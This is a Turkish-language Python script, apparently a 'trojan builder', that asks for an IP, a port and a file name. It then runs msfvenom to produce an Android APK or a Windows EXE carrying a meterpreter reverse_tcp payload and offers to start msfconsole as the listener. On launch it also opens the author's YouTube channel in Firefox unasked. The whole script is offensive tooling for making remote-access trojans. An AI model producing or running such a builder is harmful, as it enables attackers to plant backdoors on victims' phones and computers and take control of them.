import os
import time
import os, sys, logging, math, traceback, optparse, threading
from time import sleep
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

os.system("clear")

banner = """

 _____          _              ___  _           _              
|_   _| __ ___ (_) __ _ _ __  / _ \| |_   _ ___| |_ _   _ _ __ 
  | || '__/ _ \| |/ _` | '_ \| | | | | | | / __| __| | | | '__|
  | || | | (_) | | (_| | | | | |_| | | |_| \__ \ |_| |_| | |   
  |_||_|  \___// |\__,_|_| |_|\___/|_|\__,_|___/\__|\__,_|_|   
             |__/                                              
"""
from colorama import Fore, Back, Style
print(Fore.RED + banner)
print("\033[0m")
print(Fore.MAGENTA + "Youtube Kanalım : https://www.youtube.com/channel/UCTb3Yloelr1n-nfYCT98d8A?annotation_id=annotation_57818185&feature=iv&src_vid=M0ebZ4R2qjc&sub_confirmation=1")
print("")
sleep(0.3)
print(Fore.GREEN + "[1] Trojan Oluştur")
sleep(0.3)
print("")
print(Fore.BLUE + "[2] Metasploit Console")
sleep(0.3)
print("")
print("")
print(Fore.YELLOW + "[99] Çıkış")
print(Style.RESET_ALL)
os.system("firefox https://www.youtube.com/channel/UCTb3Yloelr1n-nfYCT98d8A?annotation_id=annotation_57818185&feature=iv&src_vid=M0ebZ4R2qjc&sub_confirmation=1 ")
cevap = int(input())

if cevap == 1:
    os.system("clear")
    print(banner)
    print("Android [1]")
    print("Windows [2]")
    ehha = int(input("İşletim Sistemi Seçin----->"))
    if ehha==1:
        os.system("clear")
        print(banner)
        ip = str(input("Lütfen Yerel ip Girin ----->"))
        os.system("clear")
        print(banner)
        port = str(input("Port Girin----->"))
        os.system("clear")
        print(banner)
        print("\033[93m Lütfen Dosyaya Bir Uzantı Koymayın")
        isim = str(input("Trojanın Ismini Girin----->"))
        os.system("clear")
        print(banner)
        print("Trojan Oluşturuluyor Lütfen Bekleyin...")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -o " + isim + ".apk")
        os.system("clear")
        print(banner)
        print("\033[0m")
        os.system("clear")
        print(banner)
        print("Trojan Oluşturuldu Metasploit Console'a Girmek İster misiniz ? ")
        print("\033[92m EVET [1]")
        print("\033[91m HAYIR [0]")
        eh = int(input(""))
        if eh == 1:
            os.system("clear")
            print(banner)
            print("Tamamdır...")
            os.system("msfconsole")

        else:
            os.system("clear")
            print(banner)
            print("Tamamdır Çıkış Yapılıyor İyi Günler...")
            from time import sleep

            time.sleep(3)
            os.system("cd ../../../")
            os.system("clear")
    elif ehha==2:
        os.system("clear")
        print(banner)
        ip = str(input("Lütfen Yerel ip Girin ----->"))
        os.system("clear")
        print(banner)
        port = str(input("Port Girin----->"))
        os.system("clear")
        print(banner)
        print("\033[93m Lütfen Dosyaya Bir Uzantı Koymayın")
        isim = str(input("Trojanın Ismini Girin----->"))
        os.system("clear")
        print(banner)
        print("Trojan Oluşturuluyor Lütfen Bekleyin...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + "  -o " + isim + ".exe")
        print("\033[0m")
        os.system("clear")
        print(banner)
        print("Trojan Oluşturuldu Metasploit Console'a Girmek İster misiniz ? ")
        print("\033[92m EVET [1]")
        print("\033[91m HAYIR [0]")
        eh = int(input(""))
        if eh == 1:
            os.system("clear")
            print(banner)
            print("Tamamdır...")
            os.system("msfconsole")

        else:
            os.system("clear")
            print(banner)
            print("Tamamdır Çıkış Yapılıyor İyi Günler...")
            from time import sleep

            time.sleep(3)
            os.system("cd ../../../")
            os.system("clear")


elif cevap == 2:
    os.system("clear")
    os.system("echo Başlatılıyor Lütfen Bekleyin...")
    os.system("msfconsole")
elif cevap ==99:
    os.system("clear")
    os.system("exit")







